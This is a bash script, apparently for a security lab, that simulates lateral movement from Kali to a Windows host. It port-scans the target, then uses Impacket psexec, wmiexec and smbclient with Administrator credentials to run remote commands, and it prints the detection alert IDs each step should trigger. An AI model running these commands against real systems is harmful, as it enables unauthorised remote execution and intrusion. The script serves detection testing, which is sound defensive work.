#!/bin/bash
# ====================================================================
# Script: lateral-movement.sh
# Purpose: Simulates lateral movement from Kali to Windows using Impacket
# WARNING: ONLY RUN IN ISOLATED LAB ENVIRONMENT.
# ====================================================================

echo -e "\e[31mWARNING: Only run this script in an isolated lab environment.\e[0m"
sleep 3

TARGET="192.168.56.20"
USER="Administrator"
PASS="ActualPassword123!" # Replace with actual password

# Check Impacket
if ! command -v impacket-psexec &> /dev/null; then
    echo -e "\e[36m[*] Impacket not found. Installing...\e[0m"
    pip3 install impacket
fi

echo -e "\e[36m[*] Step 1: Port scan target...\e[0m"
nmap -p 445,5985,5986,3389 $TARGET

echo -e "\e[33m[*] Step 2: PsExec via Impacket...\e[0m"
echo -e "\e[35m[Expected Alert: PsExec Execution / Lateral Movement (100120)]\e[0m"
impacket-psexec ${USER}:${PASS}@${TARGET} 'cmd.exe /c whoami & hostname & ipconfig & net user'

echo -e "\e[33m[*] Step 3: WMIExec via Impacket...\e[0m"
echo -e "\e[35m[Expected Alert: WMI Execution (100121)]\e[0m"
impacket-wmiexec ${USER}:${PASS}@${TARGET} 'whoami'

echo -e "\e[33m[*] Step 4: SMBClient enumeration...\e[0m"
impacket-smbclient ${USER}:${PASS}@${TARGET}

echo -e "\e[32m[+] Lateral movement simulation complete.\e[0m"
